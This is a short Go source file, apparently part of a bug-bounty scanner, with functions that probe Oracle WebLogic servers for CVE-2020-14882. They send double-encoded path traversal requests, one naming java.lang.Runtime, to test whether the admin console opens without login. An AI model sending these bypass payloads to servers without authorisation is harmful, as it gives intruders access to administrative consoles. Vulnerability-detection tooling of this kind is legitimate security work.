package bugbounty

import (
	"strings"
)

// ============================================================
// CVE-2020-14882 WebLogic Console Auth Bypass
// ============================================================
func ProbeWebLogic14882(base string) *Finding {
	paths := []string{
		"/console/css/%252e%252e%252fconsole.portal",
		"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.Runtime",
	}
	for _, p := range paths {
		code, body, _, err := Get(base + p)
		if err != nil {
			continue
		}
		if code == 200 && (strings.Contains(body, "Home") || strings.Contains(body, "console")) && !strings.Contains(body, "LoginForm") {
			return &Finding{Target: base, Vuln: "CVE-2020-14882 WebLogic Auth Bypass", Severity: "CRITICAL",
				Detail: "console accessible without auth", URL: base + p}
		}
	}
	return nil
}

// ============================================================
// WebLogic Console exposure
// ============================================================
func ProbeWebLogic(base string) *Finding {
	code, body, _, err := Get(base + "/console/login/LoginForm.jsp")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "WebLogic") {
		code2, body2, _, _ := Get(base + "/console/css/%252e%252e%252fconsole.portal")
		if code2 == 200 && strings.Contains(body2, "home") {
			return &Finding{Target: base, Vuln: "CVE-2020-14882 WebLogic Auth Bypass", Severity: "CRITICAL",
				Detail: "console accessible without auth", URL: base + "/console/css/%252e%252e%252fconsole.portal"}
		}
		return &Finding{Target: base, Vuln: "WebLogic Console Exposed", Severity: "MEDIUM",
			Detail: "login page found", URL: base + "/console/login/LoginForm.jsp"}
	}
	return nil
}
